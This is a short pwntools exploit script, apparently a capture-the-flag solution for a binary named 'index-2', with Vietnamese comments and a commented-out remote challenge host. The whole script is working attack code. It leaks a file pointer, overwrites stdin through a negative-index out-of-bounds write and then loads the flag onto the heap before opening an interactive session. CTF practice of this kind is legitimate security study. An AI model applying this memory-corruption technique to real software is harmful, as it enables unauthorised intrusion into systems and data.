from pwn import *
p=process('./index-2')
#p=remote('play.scriptsorcerers.xyz', 10492)
p.sendline(b'1337')
#leak f
p.sendline(b'2')
p.sendline(b'8')
sleep(3)
print(p.recv())

#ghi de stdin = f
p.sendline(b'1')
p.sendline(b'-6')
a=int(input('f: '),16)
p.sendline(p64(a))

#nap flag vao heap
p.sendline(b'1')
p.sendline(b'0')
p.sendline(p64(0))
p.interactive()
